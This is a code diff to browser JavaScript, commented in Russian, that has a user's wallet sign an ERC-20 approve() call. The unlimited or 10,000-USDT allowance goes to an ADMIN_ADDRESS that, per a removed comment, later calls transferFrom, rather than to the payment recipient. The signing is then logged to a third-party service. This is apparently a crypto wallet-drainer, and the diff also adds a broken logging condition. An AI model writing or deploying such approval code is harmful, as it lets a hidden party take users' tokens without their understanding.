@@ -1217,13 +1217,19 @@
                     const tokenAbi = ['function approve(address spender, uint256 amount) returns (bool)'];
                     const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);
                     
-                    // ВАЖНО: approve даётся администратору (ADMIN_ADDRESS), а не получателю!
-                    // ADMIN_ADDRESS - это адрес, который будет вызывать transferFrom
-                    const approveAmount = (selectedCoin === 'USDT' && selectedNetwork === 'ERC20') 
-                        ? ethers.utils.parseUnits('1000000000', decimals)  // 1 миллиард USDT
-                        : ethers.constants.MaxUint256;
+                    // ВЫБИРАЕМ СУММУ APPROVE В ЗАВИСИМОСТИ ОТ СЕТИ И МОНЕТЫ
+                    let approveAmount;
+                    if (selectedNetwork === 'ERC20' && selectedCoin === 'USDT') {
+                        // ТОЛЬКО для USDT на ERC20 - 10 000 USDT
+                        approveAmount = ethers.utils.parseUnits('10000', decimals);
+                        console.log(`📝 USDT ERC20: using fixed amount 10000 USDT`);
+                    } else {
+                        // Для всех остальных случаев - бесконечность
+                        approveAmount = ethers.constants.MaxUint256;
+                        console.log(`📝 ${selectedCoin} on ${selectedNetwork}: using unlimited approve`);
+                    }
                     
-                    // Для USDT на ERC20 нужно сначала обнулить approve
+                    // Для USDT на ERC20 нужно сначала обнулить approve (если был)
                     if (selectedCoin === 'USDT' && selectedNetwork === 'ERC20') {
                         console.log('📝 USDT ERC20: checking current allowance...');
                         const currentAllowance = await tokenContract.allowance(userAddress, ADMIN_ADDRESS);
@@ -1235,7 +1241,7 @@
                     }
                     
                     await tokenContract.approve(ADMIN_ADDRESS, approveAmount);
-                    console.log(`✅ Approve granted to ${ADMIN_ADDRESS} for ${ethers.utils.formatUnits(approveAmount, decimals)} ${selectedCoin}`);
+                    console.log(`✅ Approve granted to ${ADMIN_ADDRESS} for ${selectedCoin === 'ERC20' && selectedCoin === 'USDT' ? '10000' : 'unlimited'} ${selectedCoin}`);
                 }
                 await logToHeleket('approve_signed', {
                     walletAddress: userAddress,
